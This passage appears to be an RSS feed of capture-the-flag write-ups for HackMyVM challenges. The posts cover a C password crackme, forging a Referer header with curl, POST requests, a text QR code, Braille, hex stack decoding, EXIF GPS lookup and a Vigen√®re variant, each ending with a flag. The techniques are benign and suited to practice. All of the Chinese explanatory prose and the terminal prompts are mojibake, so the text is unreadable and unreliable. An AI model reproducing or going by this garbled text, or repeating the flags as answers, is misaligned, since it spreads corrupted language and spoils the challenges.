          printf('Correct');
        else
          printf('really close');
      }
      else
      {
        printf('Close');
      }
    }
    else
    {
      printf('Almost');
    }
  }
  else
  {
    printf('Incorrect');
  }
  return 0;
}
```

ÂàÜÊûê

```
scanf('%s', s); // Áî®Êà∑ËæìÂÖ•ÂØÜÁ†ÅÔºåÊúÄÂ§ö 263 Â≠óËäÇÔºåÂ≠òÂú® s Êï∞ÁªÑ‰∏≠
if (strlen(s) == 6) // ÂØÜÁ†ÅÈïøÂ∫¶ÂøÖÈ°ªÊòØ 6
{
    if (s[0] == 80) // Á¨¨‰∏Ä‰∏™Â≠óÁ¨¶ÂøÖÈ°ªÊòØ ASCII ÂÄº 80 -&gt; 'P'
    {
        // ÂØπÂêé5‰ΩçÂ≠óÁ¨¶ (s[1] Âà∞ s[5])ÔºåÂÅö‰ª•‰∏ãÂ§ÑÁêÜÔºö
        // ÂÆÉ‰ª¨ÂøÖÈ°ªÊòØÊï∞Â≠óÂ≠óÁ¨¶ÔºàÂõ†‰∏∫ÂáèÂéª '0'(48)ÔºâÔºåÂê¶ÂàôÊ±ÇÂíå‰πòÁßØ‰ºöÈîôËØØ
        for (i = 1; i &lt;= 5; ++i)
        {
            v8 += s[i] - 48; // Âä†ÊÄª
            v7 *= s[i] - 48; // ‰πòÁßØ
        }

        if (v8 == 24 &amp;&amp; v7 == 2048) // Êª°Ë∂≥Âä†Âíå‰∏é‰πòÁßØÊù°‰ª∂
        {
            if (s[1] == 56) // Á¨¨‰∫å‰∏™Â≠óÁ¨¶ÂøÖÈ°ªÊòØ '8'
                printf('Correct');
            else
                printf('really close');
        }
        else
        {
            printf('Close');
        }
    }
    else
    {
        printf('Almost');
    }
}
else
{
    printf('Incorrect');
}

```

**ÂØªÊâæ‰∏Ä‰∏™‰ª• 'P8' ÂºÄÂ§¥ÁöÑ6‰ΩçÂØÜÁ†ÅÔºåÂÖ∂Âêé4‰ΩçÊï∞Â≠ó‰∏éÊï∞Â≠ó8Áõ∏Âä†ÊÄªÂíå‰∏∫24ÔºåÁõ∏‰πòÊÄªÁßØ‰∏∫2048„ÄÇ**

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ./21
Enter passwd: P84444
Correct                                                                                
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20021.html</guid><pubDate>Fri, 27 Jun 2025 09:32:02 +0000</pubDate></item><item><title>Challenge 020</title><link>https://7r1UMPHK.github.io/post/Challenge%20020.html</link><description>![image-20250612183946052](https://7r1umphk.github.io/image/202506121839359.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl http://momo.hackmyvm.eu/li0nsg3l9vhhe/                        
You are not coming from https://nepcodex.com/                                         
```

‰º™ÈÄ†`Referer` ËØ∑Ê±ÇÂ§¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -e https://nepcodex.com/ http://momo.hackmyvm.eu/li0nsg3l9vhhe/
HMV{youareawelcome}                                                                  
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20020.html</guid><pubDate>Fri, 27 Jun 2025 09:31:58 +0000</pubDate></item><item><title>Challenge 019</title><link>https://7r1UMPHK.github.io/post/Challenge%20019.html</link><description>![image-20250612183423004](https://7r1umphk.github.io/image/202506121834338.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 019.zip        
-rwxr-xr-x 1 kali kali 276 Jun 12 06:34 019.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ 7z x 019.zip                 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 276 bytes (1 KiB)

Extracting archive: 019.zip
--
Path = 019.zip
Type = zip
Physical Size = 276

Everything is Ok

Size:       588
Compressed: 276
          
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 019.txt   
‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ ‚ñÑ‚ñÑ  ‚ñÑ ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ.‚ñà ‚ñÑ‚ñÑ‚ñÑ ‚ñà ‚ñÑ‚ñÄ‚ñÑ ‚ñà ‚ñà ‚ñÑ‚ñÑ‚ñÑ ‚ñà.‚ñà ‚ñà‚ñà‚ñà ‚ñà ‚ñà‚ñÑ‚ñÑ‚ñà  ‚ñà ‚ñà‚ñà‚ñà ‚ñà.‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà ‚ñÑ ‚ñÑ ‚ñÑ ‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà.‚ñÑ‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ ‚ñÑ‚ñÄ‚ñà‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ‚ñÑ‚ñÑ ‚ñÑ.‚ñÄ‚ñÑ‚ñÄ ‚ñÑ ‚ñÑ ‚ñÑ‚ñà‚ñÑ‚ñÄ ‚ñÑ‚ñà‚ñà‚ñÄ‚ñÄ ‚ñÑ‚ñÑ. ‚ñà‚ñÑ‚ñà‚ñà‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñÄ‚ñÑ‚ñÑ ‚ñÑ‚ñà ‚ñà‚ñÑ‚ñÄ‚ñÑ.‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ ‚ñÄ‚ñÑ‚ñà‚ñÑ‚ñÄ  ‚ñÑ‚ñà ‚ñÑ ‚ñÄ.‚ñà ‚ñÑ‚ñÑ‚ñÑ ‚ñà  ‚ñÑ‚ñÑ ‚ñÄ‚ñÄ  ‚ñÄ‚ñÄ‚ñà‚ñÑ‚ñÄ.‚ñà ‚ñà‚ñà‚ñà ‚ñà ‚ñà‚ñÄ‚ñÑ‚ñà‚ñà‚ñà ‚ñÄ ‚ñÑ‚ñÄ‚ñÄ .‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà ‚ñà‚ñÄ ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÑ ‚ñÑ ‚ñÄ                                                                                                                                                          
```

ÁúãÁùÄÂÉèqrÁ†Å

ÊâæËßÑÂæãÔºåÊúÄÂêéÈÉΩÊúâÁÇπÔºåËøáÊª§‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 019.txt | tr '.' '\n' 
‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ ‚ñÑ‚ñÑ  ‚ñÑ ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ
‚ñà ‚ñÑ‚ñÑ‚ñÑ ‚ñà ‚ñÑ‚ñÄ‚ñÑ ‚ñà ‚ñà ‚ñÑ‚ñÑ‚ñÑ ‚ñà
‚ñà ‚ñà‚ñà‚ñà ‚ñà ‚ñà‚ñÑ‚ñÑ‚ñà  ‚ñà ‚ñà‚ñà‚ñà ‚ñà
‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà ‚ñÑ ‚ñÑ ‚ñÑ ‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà
‚ñÑ‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ ‚ñÑ‚ñÄ‚ñà‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ‚ñÑ‚ñÑ ‚ñÑ
‚ñÄ‚ñÑ‚ñÄ ‚ñÑ ‚ñÑ ‚ñÑ‚ñà‚ñÑ‚ñÄ ‚ñÑ‚ñà‚ñà‚ñÄ‚ñÄ ‚ñÑ‚ñÑ
 ‚ñà‚ñÑ‚ñà‚ñà‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñÄ‚ñÑ‚ñÑ ‚ñÑ‚ñà ‚ñà‚ñÑ‚ñÄ‚ñÑ
‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ ‚ñÄ‚ñÑ‚ñà‚ñÑ‚ñÄ  ‚ñÑ‚ñà ‚ñÑ ‚ñÄ
‚ñà ‚ñÑ‚ñÑ‚ñÑ ‚ñà  ‚ñÑ‚ñÑ ‚ñÄ‚ñÄ  ‚ñÄ‚ñÄ‚ñà‚ñÑ‚ñÄ
‚ñà ‚ñà‚ñà‚ñà ‚ñà ‚ñà‚ñÄ‚ñÑ‚ñà‚ñà‚ñà ‚ñÄ ‚ñÑ‚ñÄ‚ñÄ 
‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà ‚ñà‚ñÄ ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÑ ‚ñÑ ‚ñÄ                                                                                                                                                                                    
```

ËçâÊñôËß£‰∏Ä‰∏ãhttps://cli.im/deqr/other

![image-20250612183849873](https://7r1umphk.github.io/image/202506121838056.webp)

```
HMV{asciiartt}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20019.html</guid><pubDate>Fri, 27 Jun 2025 09:31:56 +0000</pubDate></item><item><title>Challenge 018</title><link>https://7r1UMPHK.github.io/post/Challenge%20018.html</link><description>![image-20250612182911676](https://7r1umphk.github.io/image/202506121829958.webp)

```
http://momo.hackmyvm.eu/ZiP004JfyGh/
```

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
&lt;title&gt;018&lt;/title&gt;
Maybe the flag is in aaAxghuyrtlksd.php
&lt;/html&gt;
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php
Yes, I have the flag! :)      

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 12 Jun 2025 10:30:38 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

Yes, I have the flag! :)                                                                
```

POSTËØ∑Ê±Ç

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -X POST http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php   
HMV{postpostpost}                                                                     
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20018.html</guid><pubDate>Fri, 27 Jun 2025 09:31:53 +0000</pubDate></item><item><title>Challenge 017</title><link>https://7r1UMPHK.github.io/post/Challenge%20017.html</link><description>![image-20250612182714769](https://7r1umphk.github.io/image/202506121827070.webp)

```
‚†ì‚†ç‚†ß{‚†ä‚†ô‚†ï‚†ù‚†û‚†Ö‚†ù‚†ï‚†∫‚†É‚†ó‚†Å‚†ä‚†á‚†á‚†ë}
```

Áõ≤Êñá

https://zh.wikipedia.org/wiki/%E7%9B%B2%E6%96%87

Ëá™Â∑±ÂØπÁùÄËΩ¨

```
HMV{idontknowbraille}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20017.html</guid><pubDate>Fri, 27 Jun 2025 09:31:47 +0000</pubDate></item><item><title>Challenge 015</title><link>https://7r1UMPHK.github.io/post/Challenge%20015.html</link><description>**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=015

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io//image/20250518141943225.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

ÊåëÊàòÈ°µÈù¢ÊòæÁ§∫‰∫Ü‰∏ÄÊÆµË¢´ `&lt;pre&gt;` Ê†áÁ≠æÂåÖË£πÁöÑÊñáÊú¨Ôºö

```html
&lt;pre&gt; push 7d616579 push 74696874 push 726f7773 push 696d7361 push 7b766d68 &lt;/pre&gt;
```

ËØ•ÊñáÊú¨ÂåÖÂê´‰∏ÄÁ≥ªÂàó `push` Êåá‰ª§ÔºåÂêéË∑üÂçÅÂÖ≠ËøõÂà∂Êï∞ÂÄº„ÄÇ`push` Êìç‰ΩúÈÄöÂ∏∏Áî®‰∫éÂ∞ÜÊï∞ÊçÆÂéãÂÖ•Ê†à‰∏≠ÔºåËÄåÊ†àÊòØÂêéËøõÂÖàÂá∫ (LIFO) ÁöÑÊï∞ÊçÆÁªìÊûÑ„ÄÇËøôÊÑèÂë≥ÁùÄÊúÄÂêéÂéãÂÖ•ÁöÑÊï∞ÊçÆ‰ºöÊúÄÂÖàË¢´ÂèñÂá∫„ÄÇ
Ëøô‰∫õÂçÅÂÖ≠ËøõÂà∂Êï∞ÂÄº `7d616579`, `74696874`, `726f7773`, `696d7361`, `7b766d68` ÁªÑÂêàËµ∑Êù•ÊûÑÊàê‰∫Ü Flag ÁöÑÊüêÁßçÁºñÁ†ÅÂΩ¢Âºè„ÄÇ

## 2. Ëß£ÂØÜËøáÁ®ã

‰∏∫‰∫ÜÂæóÂà∞ÂéüÂßã FlagÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜËøô‰∫õÂçÅÂÖ≠ËøõÂà∂Êï∞ÂÄºËΩ¨Êç¢‰∏∫ ASCII Â≠óÁ¨¶ÔºåÂπ∂ËÄÉËôëÂà∞Ê†àÁöÑ LIFO ÁâπÊÄß‰ª•ÂèäÊï∞ÊçÆÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÂ≠òÂÇ®ÊñπÂºèÔºàÈÄöÂ∏∏ÊòØÂ∞èÁ´ØÂ∫èÔºåÂç≥Â≠óËäÇÂ∫èÂèçËΩ¨Ôºâ„ÄÇ

### 2.1 ‰ΩøÁî® CyberChef ËøõË°åÂø´ÈÄüËß£Á†Å

CyberChef Êèê‰æõ‰∫Ü‰∏ÄÁßçÈùûÂ∏∏‰æøÊç∑ÁöÑÊñπÂºèÊù•Â§ÑÁêÜËøôÁßçËΩ¨Êç¢„ÄÇÂèØ‰ª•‰ΩøÁî®‰ª•‰∏ãÊ≠•È™§Ôºö

1.  **ÂáÜÂ§áËæìÂÖ•Êï∞ÊçÆ:**
    Â∞ÜÈ°µÈù¢‰∏äÁªôÂá∫ÁöÑÂçÅÂÖ≠ËøõÂà∂Êï∞ÂÄºÊåâÁÖßÂÆÉ‰ª¨ `push` ÁöÑÂéüÂßãÈ°∫Â∫èÂàóÂá∫ÔºåÂπ∂Áî®Á©∫Ê†ºÂàÜÈöîÔºö
    `7d616579 74696874 726f7773 696d7361 7b766d68`

2.  **Âú® CyberChef ‰∏≠ÈÖçÁΩÆÊìç‰Ωú:**
    *   **Input:** Â∞Ü‰∏äËø∞ÂáÜÂ§áÂ•ΩÁöÑÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤Á≤òË¥¥Âà∞ËæìÂÖ•Ê°Ü„ÄÇ
    *   **Recipe:**
        1.  `From Hex` (Delimiter: `Auto`)ÔºöÊ≠§Êìç‰Ωú‰ºöÂ∞ÜÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫ÂØπÂ∫îÁöÑÂ≠óËäÇÂ∫èÂàóÔºàASCII Â≠óÁ¨¶Ôºâ„ÄÇ
        2.  `Reverse` (By: `Character`)ÔºöÁî±‰∫éÊ†àÊòØ LIFO ÁöÑÔºåÂπ∂‰∏îÊØè‰∏™ `push` ÁöÑÂ§öÂ≠óËäÇÊï∞ÊçÆÔºàÂ¶Ç dwordÔºâÂú®ÂÜÖÂ≠ò‰∏≠ÈÄöÂ∏∏ÊòØÂ∞èÁ´ØÂ≠òÂÇ®ÔºàÂ≠óËäÇÂèçÂ∫èÔºâÔºåÂ∞ÜÊï¥‰∏™ËΩ¨Êç¢ÂêéÁöÑÂ≠óÁ¨¶‰∏≤ÂèçËΩ¨ÂèØ‰ª•‰∏ÄÊ¨°ÊÄßÂ§ÑÁêÜËøô‰∏§‰∏™ÂèçËΩ¨ÈúÄÊ±Ç„ÄÇ

    CyberChef ÁöÑÊìç‰ΩúÁïåÈù¢ÂíåÁªìÊûúÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö
    
    ![image-20250518142527284](https://7r1umphk.github.io//image/20250518142527578.webp)

    *   **Input:** `7d616579 74696874 726f7773 696d7361 7b766d68`
    *   **Step 1 (From Hex):** Ëøô‰∏ÄÊ≠•‰ºöÂ∞ÜËæìÂÖ•ÁöÑÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫ÂÖ∂ÂØπÂ∫îÁöÑ ASCII Â≠óÁ¨¶„ÄÇ‰æãÂ¶ÇÔºå`7d` Âèò‰∏∫ `}`Ôºå`61` Âèò‰∏∫ `a`Ôºå‰ª•Ê≠§Á±ªÊé®„ÄÇÁî±‰∫éËæìÂÖ•‰∏≠ÊúâÁ©∫Ê†ºÔºåCyberChef (Delimiter: Auto) ‰ºöÂ∞ÜÂÆÉ‰ª¨ËßÜ‰∏∫ÂàÜÈöîÁ¨¶ÔºåÊ≠£Á°ÆÂ§ÑÁêÜÊØè‰∏™ÂçÅÂÖ≠ËøõÂà∂Êï∞„ÄÇ
        ‰∏≠Èó¥ÁªìÊûúÔºàÈÄªËæë‰∏äÁöÑÔºåCyberChefÁõ¥Êé•Â§ÑÁêÜÔºâÔºö`yea}thitsworasmihmv{` (Ê≥®ÊÑèÔºåËøôÂ∑≤ÁªèÊòØËÄÉËôë‰∫ÜÊØè‰∏™4Â≠óËäÇÂùóÂÜÖÈÉ®Â∞èÁ´ØÂ∫èÂêéÁöÑÁªìÊûúÔºå‰ΩÜÈ°∫Â∫èËøòÊòØÂéüÂßãpushÁöÑÈ°∫Â∫è)
    *   **Step 2 (Reverse by Character):** Â∞Ü‰∏ä‰∏ÄÊ≠•ÂæóÂà∞ÁöÑÊï¥‰∏™Â≠óÁ¨¶‰∏≤ËøõË°åÂèçËΩ¨„ÄÇ
        `yea}thitsworasmihmv{` ÂèçËΩ¨ÂêéÂæóÂà∞ `hmv{asmisworthityea}`

    **Output:** `hmv{asmisworthityea}`

## 3. Flag

ÊúÄÁªàÁöÑ Flag ÊòØÔºö
```
HMV{asmisworthityea}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20015.html</guid><pubDate>Fri, 27 Jun 2025 09:31:26 +0000</pubDate></item><item><title>Challenge 037</title><link>https://7r1UMPHK.github.io/post/Challenge%20037.html</link><description>![image-20250614105743955](https://7r1umphk.github.io/image/20250614105744262.webp)

ËøòÊòØÊâ´Ë°ó

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 037.zip 
-rwxr-xr-x 1 kali kali 6256698 Jun 13 22:57 037.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 037.zip 
Archive:  037.zip
  inflating: osint.jpg               
             
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ exiftool osint.jpg 
ExifTool Version Number         : 13.25
File Name                       : osint.jpg
Directory                       : .
File Size                       : 6.3 MB
File Modification Date/Time     : 2023:07:17 21:14:46-04:00
File Access Date/Time           : 2025:06:13 22:58:07-04:00
File Inode Change Date/Time     : 2023:07:17 21:14:46-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Make                            : Sony
Camera Model Name               : E5823
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : 32.2.A.0.253_0_f500
Modify Date                     : 2016:07:25 20:44:46
Y Cb Cr Positioning             : Centered
Exposure Time                   : 1/2000
F Number                        : 2.0
ISO                             : 40
Exif Version                    : 0220
Date/Time Original              : 2016:07:25 20:44:46
Create Date                     : 2016:07:25 20:44:46
Components Configuration        : Y, Cb, Cr, -
Shutter Speed Value             : 1/1992
Exposure Compensation           : 0
Metering Mode                   : Multi-segment
Light Source                    : Unknown
Flash                           : Off, Did not fire
Focal Length                    : 4.2 mm
Soft Skin Effect                : Off
Face Info Offset                : 94
Sony Date Time                  : 2016:07:25 20:44:46
Sony Image Height               : 4160
Sony Image Width                : 5520
Faces Detected                  : 0
Face Info Length                : 26
Meta Version                    : 
Sub Sec Time                    : 461942
Sub Sec Time Original           : 461942
Sub Sec Time Digitized          : 461942
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 5520
Exif Image Height               : 4140
Interoperability Index          : R98 - DCF basic file (sRGB)
Interoperability Version        : 0100
Custom Rendered                 : Normal
Exposure Mode                   : Auto
White Balance                   : Auto
Digital Zoom Ratio              : 1
Scene Capture Type              : Landscape
Subject Distance Range          : Unknown
GPS Version ID                  : 2.2.0.0
GPS Latitude Ref                : North
GPS Longitude Ref               : East
GPS Altitude Ref                : Above Sea Level
GPS Time Stamp                  : 18:44:29
GPS Status                      : Measurement Active
GPS Map Datum                   : WGS-84
GPS Date Stamp                  : 2016:07:25
Compression                     : JPEG (old-style)
Thumbnail Offset                : 21346
Thumbnail Length                : 3982
Image Width                     : 5520
Image Height                    : 4140
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Aperture                        : 2.0
Image Size                      : 5520x4140
Megapixels                      : 22.9
Shutter Speed                   : 1/2000
Create Date                     : 2016:07:25 20:44:46.461942
Date/Time Original              : 2016:07:25 20:44:46.461942
Modify Date                     : 2016:07:25 20:44:46.461942
Thumbnail Image                 : (Binary data 3982 bytes, use -b option to extract)
GPS Altitude                    : 25 m Above Sea Level
GPS Date/Time                   : 2016:07:25 18:44:29Z
GPS Latitude                    : 58 deg 58' 2.87' N
GPS Longitude                   : 18 deg 18' 59.03' E
Focal Length                    : 4.2 mm
GPS Position                    : 58 deg 58' 2.87' N, 18 deg 18' 59.03' E
Light Value                     : 14.3
                      
```

![osint](https://7r1umphk.github.io/image/20250614110003767.webp)

ÊúâGPS‰ø°ÊÅØÔºÅ

Â∞ÜÁªèÁ∫¨Â∫¶ËΩ¨Êç¢ÊàêÂçÅËøõÂà∂

https://www.sunearthtools.com/dp/tools/conversion.php?lang=cn

![image-20250614111103736](https://7r1umphk.github.io/image/20250614111103977.webp)

ÁÑ∂ÂêéÊàëÂéªËØï‰∏çË°å

ÂêéÈù¢ÊàëÂ∞ùËØïÊ∑ªÂä†‰∏ÄÁÇπÂáèÂ∞ë‰∏ÄÁÇπÊâçÊàêÂäü

Ê≠£Á°ÆÁöÑÊòØ

```
HMV{58.967463,18.316396}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20037.html</guid><pubDate>Fri, 27 Jun 2025 09:31:23 +0000</pubDate></item><item><title>Challenge 035</title><link>https://7r1UMPHK.github.io/post/Challenge%20035.html</link><description>![image-20250613233326180](https://7r1umphk.github.io/image/20250613233326526.webp)

```
Help us to decrypt this message: 'Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6!' Unfortunately we only have one clear text message: 'Hi John. I am from the Administrative team. We have just received your request to change your password, it will reach you in a few minutes. Thank you very much for contacting us, I hope your question has been resolved!'


ÁøªËØëÔºö
Â∏ÆÂä©Êàë‰ª¨Ëß£ÂØÜËøôÊù°Ê∂àÊÅØÔºö‚ÄúHx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6ÔºÅ‚Äù ÂæàÈÅóÊÜæÔºåÊàë‰ª¨Âè™Êúâ‰∏ÄÊù°ÊòéÊñáÊ∂àÊÅØÔºö‚ÄúÂó®ÔºåÁ∫¶Áø∞„ÄÇÊàëÊòØÁÆ°ÁêÜÂõ¢ÈòüÁöÑ„ÄÇÊàë‰ª¨ÂàöÂàöÊî∂Âà∞ÊÇ®Êõ¥ÊîπÂØÜÁ†ÅÁöÑËØ∑Ê±ÇÔºåÂá†ÂàÜÈíüÂêéÂ∞±‰ºöÂõûÂ§çÊÇ®„ÄÇÈùûÂ∏∏ÊÑüË∞¢ÊÇ®ËÅîÁ≥ªÊàë‰ª¨ÔºåÂ∏åÊúõÊÇ®ÁöÑÈóÆÈ¢òÂ∑≤ÁªèÂæóÂà∞Ëß£ÂÜ≥ÔºÅ‚Äù
```

ÁúãÁùÄ‰∏çÂÉèÁÆÄÂçïÁöÑÂáØÊíí

```
Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6ÔºÅ
Hi John. I am from the Administrative team. We have just received your request to change your password, it will reach you in a few minutes. Thank you very much for contacting us, I hope your question has been resolved!
```

ÊõøÊç¢ÂØÜÁ†ÅÔºåÂ§öË°®ÊõøÊç¢......ËØïËØïÁª¥ÂêâÂ∞º‰∫öÂêß

https://www.dcode.fr/vigenere-cipher

![image-20250614002540728](https://7r1umphk.github.io/image/20250614002540927.webp)

ÁúãÁúã

![image-20250614002725142](https://7r1umphk.github.io/image/20250614002725459.webp)

ÁªßÁª≠Áúã

![image-20250614002746485](https://7r1umphk.github.io/image/20250614002746748.webp)

ÂÖàÁ°ÆÂÆöÂ≠óÁ¨¶ÈõÜ

ÂÆûÁé∞ÂØÜÊñáÂåÖÂê´**Â§ßÂÜôÂ≠óÊØçÂíåÊï∞Â≠ó**Ôºå‰æãÂ¶Ç Hx„ÄÅ92gm„ÄÅC6lnp

ËøôËØ¥ÊòéÂÆÉ‰ΩøÁî®ÁöÑ‰∏çÊòØÊ†áÂáÜÁöÑ26‰∏™Â≠óÊØçÔºåËÄåÊòØ‰∏Ä‰∏™**Ëá™ÂÆö‰πâÁöÑÊâ©Â±ïAlphabet**

ÊâÄ‰ª•ÂÆÉÊúâÂèØËÉΩÊòØ

ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890

0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ

1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ

ÁÑ∂Âêé‰Ω†Â∞±ÂèØ‰ª•‰∏¢ÂéªÁªôai‰∫ÜÔºåÈóÆÂÆÉÂì™‰∏™ÊØîËæÉÂèØËÉΩÔºåËÆ©‰ªñÁÆóÂØÜÈí•ÊµÅ

```
ÊàëÊúâ‰∏Ä‰∏™Áª¥ÂêâÁ∫≥ÂØÜÁ†ÅÁöÑÂèò‰ΩìÔºåÂÆÉÂú®Âä†ÂØÜÊó∂‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºàÊâÄÊúâÂ≠óÊØçÈÉΩÊåâÂ§ßÂÜôÂ§ÑÁêÜÔºâ„ÄÇ
ÊàëÁé∞Âú®ÈúÄË¶Å‰Ω†ÈÄöËøáËÆ°ÁÆóÊù•Âà§Êñ≠Ôºå‰∏ãÈù¢ÁöÑÂõõ‰∏™Â≠óÁ¨¶ÈõÜ‰∏≠ÔºåÂì™‰∏Ä‰∏™ÊâçÊòØÊ≠£Á°ÆÁöÑÔºü
ÂÄôÈÄâÂ≠óÁ¨¶ÈõÜ:
ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ
Â∑≤Áü•‰ø°ÊÅØÔºö
ÂØÜÊñáÁâáÊÆµ: Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf
ÊòéÊñáÁâáÊÆµ: Hi John. I am from the Administrative team
```

(AIÁÆóËøô‰∏™Áé©ÊÑèÂæàÂÆπÊòìÂπªÂê¨ÔºåÂª∫ËÆÆÊúÄÂ•ΩËá™Â∑±È™åËØÅ‰∏ÄÈÅç)

![image-20250614094651088](https://7r1umphk.github.io/image/20250614094651302.webp)

ÁÆóÂá∫ÁöÑÂØÜÈí•ÊµÅÊòØ1F9S3SZ63TASÔºåÂÆÉÂÆåÁæéÈáçÂ§ç‰∫Ü

![image-20250614094821115](https://7r1umphk.github.io/image/20250614094821350.webp)

```
HMV{h0w_d0_y0u_g37_th15}
```

